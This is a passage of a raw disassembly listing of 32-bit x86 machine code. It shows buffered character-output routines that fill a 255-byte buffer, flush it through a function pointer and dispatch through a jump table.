  405429:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  405430:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  405437:	00 
  405438:	89 1c 24             	mov    %ebx,(%esp)
  40543b:	89 44 24 08          	mov    %eax,0x8(%esp)
  40543f:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  405445:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  40544c:	31 c0                	xor    %eax,%eax
  40544e:	e9 ba f4 ff ff       	jmp    0x40490d
  405453:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  405459:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  405460:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  405467:	00 
  405468:	89 1c 24             	mov    %ebx,(%esp)
  40546b:	89 44 24 08          	mov    %eax,0x8(%esp)
  40546f:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  405475:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  40547c:	31 c0                	xor    %eax,%eax
  40547e:	e9 65 f7 ff ff       	jmp    0x404be8
  405483:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  405489:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  405490:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  405497:	00 
  405498:	89 1c 24             	mov    %ebx,(%esp)
  40549b:	89 44 24 08          	mov    %eax,0x8(%esp)
  40549f:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  4054a5:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  4054ac:	31 c0                	xor    %eax,%eax
  4054ae:	e9 fe f6 ff ff       	jmp    0x404bb1
  4054b3:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  4054b9:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  4054c0:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  4054c7:	00 
  4054c8:	89 1c 24             	mov    %ebx,(%esp)
  4054cb:	89 44 24 08          	mov    %eax,0x8(%esp)
  4054cf:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  4054d5:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  4054dc:	31 c0                	xor    %eax,%eax
  4054de:	e9 a3 f5 ff ff       	jmp    0x404a86
  4054e3:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  4054e9:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  4054f0:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  4054f7:	00 
  4054f8:	89 1c 24             	mov    %ebx,(%esp)
  4054fb:	89 44 24 08          	mov    %eax,0x8(%esp)
  4054ff:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  405505:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  40550c:	31 c0                	xor    %eax,%eax
  40550e:	e9 41 f5 ff ff       	jmp    0x404a54
  405513:	8b 45 04             	mov    0x4(%ebp),%eax
  405516:	83 38 01             	cmpl   $0x1,(%eax)
  405519:	0f 85 e9 f4 ff ff    	jne    0x404a08
  40551f:	8b 55 08             	mov    0x8(%ebp),%edx
  405522:	83 3a 29             	cmpl   $0x29,(%edx)
  405525:	0f 44 e8             	cmove  %eax,%ebp
  405528:	e9 db f4 ff ff       	jmp    0x404a08
  40552d:	8b 54 24 18          	mov    0x18(%esp),%edx
  405531:	8b 4d 04             	mov    0x4(%ebp),%ecx
  405534:	89 d8                	mov    %ebx,%eax
  405536:	e8 65 14 00 00       	call   0x4069a0
  40553b:	ba 26 7c 42 00       	mov    $0x427c26,%edx
  405540:	89 d8                	mov    %ebx,%eax
  405542:	e8 79 d8 ff ff       	call   0x402dc0
  405547:	e9 b4 da ff ff       	jmp    0x403000
  40554c:	31 ff                	xor    %edi,%edi
  40554e:	31 f6                	xor    %esi,%esi
  405550:	e9 40 ee ff ff       	jmp    0x404395
  405555:	ba 5f 00 00 00       	mov    $0x5f,%edx
  40555a:	e9 34 f7 ff ff       	jmp    0x404c93
  40555f:	8b 7c 24 18          	mov    0x18(%esp),%edi
  405563:	8b 4d 04             	mov    0x4(%ebp),%ecx
  405566:	89 d8                	mov    %ebx,%eax
  405568:	89 fa                	mov    %edi,%edx
  40556a:	e8 31 14 00 00       	call   0x4069a0
  40556f:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  405573:	89 fa                	mov    %edi,%edx
  405575:	89 d8                	mov    %ebx,%eax
  405577:	e8 84 13 00 00       	call   0x406900
  40557c:	e9 7f da ff ff       	jmp    0x403000
  405581:	8b 49 04             	mov    0x4(%ecx),%ecx
  405584:	e9 af fc ff ff       	jmp    0x405238
  405589:	89 bb 34 01 00 00    	mov    %edi,0x134(%ebx)
  40558f:	c7 83 18 01 00 00 01 	movl   $0x1,0x118(%ebx)
  405596:	00 00 00 
  405599:	e9 62 da ff ff       	jmp    0x403000
  40559e:	39 ef                	cmp    %ebp,%edi
  4055a0:	76 b3                	jbe    0x405555
  4055a2:	3c 5f                	cmp    $0x5f,%al
  4055a4:	75 af                	jne    0x405555
  4055a6:	81 fa ff 00 00 00    	cmp    $0xff,%edx
  4055ac:	77 a7                	ja     0x405555
  4055ae:	81 bb 00 01 00 00 ff 	cmpl   $0xff,0x100(%ebx)
  4055b5:	00 00 00 
  4055b8:	89 d6                	mov    %edx,%esi
  4055ba:	75 33                	jne    0x4055ef
  4055bc:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  4055c2:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  4055c9:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  4055d0:	00 
  4055d1:	89 1c 24             	mov    %ebx,(%esp)
  4055d4:	89 44 24 08          	mov    %eax,0x8(%esp)
  4055d8:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  4055de:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  4055e5:	c7 83 00 01 00 00 00 	movl   $0x0,0x100(%ebx)
  4055ec:	00 00 00 
  4055ef:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  4055f5:	89 f1                	mov    %esi,%ecx
  4055f7:	89 ee                	mov    %ebp,%esi
  4055f9:	8d 50 01             	lea    0x1(%eax),%edx
  4055fc:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  405602:	88 0c 03             	mov    %cl,(%ebx,%eax,1)
  405605:	88 8b 04 01 00 00    	mov    %cl,0x104(%ebx)
  40560b:	e9 a2 f6 ff ff       	jmp    0x404cb2
  405610:	ba 2d 00 00 00       	mov    $0x2d,%edx
  405615:	89 d8                	mov    %ebx,%eax
  405617:	e8 e4 d2 ff ff       	call   0x402900
  40561c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40561f:	e9 7c f9 ff ff       	jmp    0x404fa0
  405624:	8b 42 04             	mov    0x4(%edx),%eax
  405627:	0f b6 00             	movzbl (%eax),%eax
  40562a:	3c 30                	cmp    $0x30,%al
  40562c:	74 19                	je     0x405647
  40562e:	3c 31                	cmp    $0x31,%al
  405630:	0f 85 4f d9 ff ff    	jne    0x402f85
  405636:	ba 07 7c 42 00       	mov    $0x427c07,%edx
  40563b:	89 d8                	mov    %ebx,%eax
  40563d:	e8 7e d7 ff ff       	call   0x402dc0
  405642:	e9 b9 d9 ff ff       	jmp    0x403000
  405647:	ba 01 7c 42 00       	mov    $0x427c01,%edx
  40564c:	89 d8                	mov    %ebx,%eax
  40564e:	e8 6d d7 ff ff       	call   0x402dc0
  405653:	e9 a8 d9 ff ff       	jmp    0x403000
  405658:	90                   	nop
  405659:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405660:	55                   	push   %ebp
  405661:	57                   	push   %edi
  405662:	56                   	push   %esi
  405663:	53                   	push   %ebx
  405664:	83 ec 2c             	sub    $0x2c,%esp
  405667:	8b 39                	mov    (%ecx),%edi
  405669:	8d 77 fd             	lea    -0x3(%edi),%esi
  40566c:	83 fe 2a             	cmp    $0x2a,%esi
  40566f:	77 3b                	ja     0x4056ac
  405671:	89 cd                	mov    %ecx,%ebp
  405673:	89 d7                	mov    %edx,%edi
  405675:	89 c3                	mov    %eax,%ebx
  405677:	ff 24 b5 20 7e 42 00 	jmp    *0x427e20(,%esi,4)
  40567e:	66 90                	xchg   %ax,%ax
  405680:	8b 80 00 01 00 00    	mov    0x100(%eax),%eax
  405686:	3d ff 00 00 00       	cmp    $0xff,%eax
  40568b:	0f 84 b4 05 00 00    	je     0x405c45
  405691:	8d 50 01             	lea    0x1(%eax),%edx
  405694:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  40569a:	c6 04 03 20          	movb   $0x20,(%ebx,%eax,1)
  40569e:	89 fa                	mov    %edi,%edx
  4056a0:	c6 83 04 01 00 00 20 	movb   $0x20,0x104(%ebx)
  4056a7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4056aa:	89 d8                	mov    %ebx,%eax
  4056ac:	83 c4 2c             	add    $0x2c,%esp
  4056af:	5b                   	pop    %ebx
  4056b0:	5e                   	pop    %esi
  4056b1:	5f                   	pop    %edi
  4056b2:	5d                   	pop    %ebp
  4056b3:	e9 58 d8 ff ff       	jmp    0x402f10
  4056b8:	90                   	nop
  4056b9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4056c0:	8b 80 00 01 00 00    	mov    0x100(%eax),%eax
  4056c6:	be 12 7e 42 00       	mov    $0x427e12,%esi
  4056cb:	eb 26                	jmp    0x4056f3
  4056cd:	8d 76 00             	lea    0x0(%esi),%esi
  4056d0:	89 c1                	mov    %eax,%ecx
  4056d2:	83 c0 01             	add    $0x1,%eax
  4056d5:	83 c6 01             	add    $0x1,%esi
  4056d8:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  4056de:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  4056e1:	81 fe 1c 7e 42 00    	cmp    $0x427e1c,%esi
  4056e7:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  4056ed:	0f 84 dd 04 00 00    	je     0x405bd0
  4056f3:	3d ff 00 00 00       	cmp    $0xff,%eax
  4056f8:	0f b6 16             	movzbl (%esi),%edx
  4056fb:	75 d3                	jne    0x4056d0
  4056fd:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  405703:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40570a:	88 54 24 1f          	mov    %dl,0x1f(%esp)
  40570e:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  405715:	00 
  405716:	89 1c 24             	mov    %ebx,(%esp)
  405719:	89 44 24 08          	mov    %eax,0x8(%esp)
  40571d:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  405723:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  40572a:	b8 01 00 00 00       	mov    $0x1,%eax
  40572f:	31 c9                	xor    %ecx,%ecx
  405731:	0f b6 54 24 1f       	movzbl 0x1f(%esp),%edx
  405736:	eb 9d                	jmp    0x4056d5
  405738:	90                   	nop
  405739:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405740:	8b 49 04             	mov    0x4(%ecx),%ecx
  405743:	e9 64 ff ff ff       	jmp    0x4056ac
  405748:	90                   	nop
  405749:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405750:	8b 80 00 01 00 00    	mov    0x100(%eax),%eax
  405756:	be dc 7d 42 00       	mov    $0x427ddc,%esi
  40575b:	eb 26                	jmp    0x405783
  40575d:	8d 76 00             	lea    0x0(%esi),%esi
  405760:	89 c1                	mov    %eax,%ecx
  405762:	83 c0 01             	add    $0x1,%eax
  405765:	83 c6 01             	add    $0x1,%esi
  405768:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  40576e:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  405771:	81 fe e5 7d 42 00    	cmp    $0x427de5,%esi
  405777:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  40577d:	0f 84 92 01 00 00    	je     0x405915
  405783:	3d ff 00 00 00       	cmp    $0xff,%eax
  405788:	0f b6 16             	movzbl (%esi),%edx
  40578b:	75 d3                	jne    0x405760
  40578d:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  405793:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40579a:	88 54 24 1f          	mov    %dl,0x1f(%esp)
  40579e:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  4057a5:	00 
  4057a6:	89 1c 24             	mov    %ebx,(%esp)
  4057a9:	89 44 24 08          	mov    %eax,0x8(%esp)
  4057ad:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  4057b3:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  4057ba:	b8 01 00 00 00       	mov    $0x1,%eax
  4057bf:	31 c9                	xor    %ecx,%ecx
  4057c1:	0f b6 54 24 1f       	movzbl 0x1f(%esp),%edx
  4057c6:	eb 9d                	jmp    0x405765
  4057c8:	90                   	nop
  4057c9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4057d0:	8b 80 00 01 00 00    	mov    0x100(%eax),%eax
  4057d6:	be e6 7d 42 00       	mov    $0x427de6,%esi
  4057db:	eb 26                	jmp    0x405803
  4057dd:	8d 76 00             	lea    0x0(%esi),%esi
  4057e0:	89 c1                	mov    %eax,%ecx
  4057e2:	83 c0 01             	add    $0x1,%eax
  4057e5:	83 c6 01             	add    $0x1,%esi
  4057e8:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  4057ee:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  4057f1:	81 fe ef 7d 42 00    	cmp    $0x427def,%esi
  4057f7:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  4057fd:	0f 84 12 01 00 00    	je     0x405915
  405803:	3d ff 00 00 00       	cmp    $0xff,%eax
  405808:	0f b6 16             	movzbl (%esi),%edx
  40580b:	75 d3                	jne    0x4057e0
  40580d:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
